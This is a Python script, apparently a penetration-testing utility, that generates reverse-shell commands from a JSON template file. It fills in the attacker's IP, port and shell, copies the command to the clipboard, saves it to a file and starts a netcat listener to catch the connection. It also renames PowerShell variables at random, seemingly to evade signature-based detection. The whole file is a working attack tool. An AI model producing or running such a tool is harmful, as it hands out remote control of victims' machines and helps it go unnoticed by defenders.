#!/usr/bin/env python3

from datetime import datetime
import json
import os
import sys
import random
import pyperclip

# TODO: launch with arguments

def main():
    if len(sys.argv) > 1:
        pass
        exit(0)
    os.system("clear")
    command, opsys = get_rev_shell()
    print(20*"-")
    os.system("clear")
    lhost = get_my_ip()
    os.system("clear")
    print(20*"-")
    lport = input(f'[+] Choose a port: ')
    print(20*"-")
    os.system("clear")
    shell = get_shell(opsys)
    os.system("clear")
    print(20*"-")
    command = command.replace("{ip}", lhost)
    command = command.replace("{port}", lport)
    command = command.replace("{shell}", shell)
    pyperclip.copy(command)
    print(command)
    now = datetime.strftime(datetime.now(), "%m%d_%H%M%S")
    command_file = f"revshell_{now}.txt"
    with open(command_file, "w") as cf:
        cf.write(command)
        cf.flush()
    print(20*"-")
    print(f"[*] Command copied to clipboard and written to file: {command_file}")
    start_listener(lport)

def start_listener(lport: str):
    option = input("[?] Start listener? (y/n)\n")
    if option.lower() == "y":
        if lport in ["80", "443", "22", "21", "53"]:
            os.system(f'sudo nc -nlvp {lport}')
        else:
            os.system(f'nc -nlvp {lport}')

def get_rev_shell():
    with open("/opt/rev_sheller/revshells.json", "r") as j:
        data = json.loads(j.read())    
    counter = 1
    opsys = rev_shell_type()
    for d in data:
        if opsys in d["meta"]:
            print(f'[{counter}] {d["name"]}')
        counter += 1    
    option = int(input(f'[+] Choose a revshell: '))-1
    if "powershell" in data[option]["name"].lower():
        command = randomize_powershell_variables(data[option]["command"])
    else:
        command = data[option]["command"]
    return (command, opsys)

def rev_shell_type():
    opsys = ["linux", "mac", "windows"]
    c = 1
    for op in opsys:
        print(f'[{c}] {op}')
        c += 1
    option = int(input("[+] Choose OS: "))-1
    os.system("clear")
    return opsys[option]

def get_my_ip():    
    myips = os.popen('hostname -I').read().split(' ')
    myips.pop()
    counter = 1
    for ip in myips:
        print(f'[{counter}] {ip}')
        counter +=1
    lhost = int(input(f'[+] Choose LHOST: '))-1
    return myips[lhost]

def randomize_powershell_variables(command: str):
    bad_vars = ["$LHOST", "$LPORT", "$TCPClient", "$NetworkStream", "$StreamReader", "$StreamWriter", "$Buffer", "$RawData", "$Code", "$Output", "$client", "$stream", "$data", "$sendback2", "$sendback", "$sendbyte", "$bytes"]
    for var in bad_vars:
        new_var = random_variable_generator()
        command = command.replace(var, new_var)
    return command

def random_variable_generator():    
    abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
    new_var = "$"
    for i in range(8):
        new_var += random.choice(abc)
    return new_var

def get_shell(opsys: str):
    os_shells = {
        "windows" : ['cmd', 'powershell'],
        "linux" : ['sh', '/bin/sh', 'bash', '/bin/bash', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],
        "mac" : ['sh', '/bin/sh', 'bash', '/bin/bash', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
    }
    shells = os_shells[opsys]
    counter = 1
    for sh in shells:
        print(f'[{counter}] {sh}')
        counter += 1
    index = int(input("[+] Choose a shell: "))-1
    return shells[index]

if __name__ == "__main__":
    main()
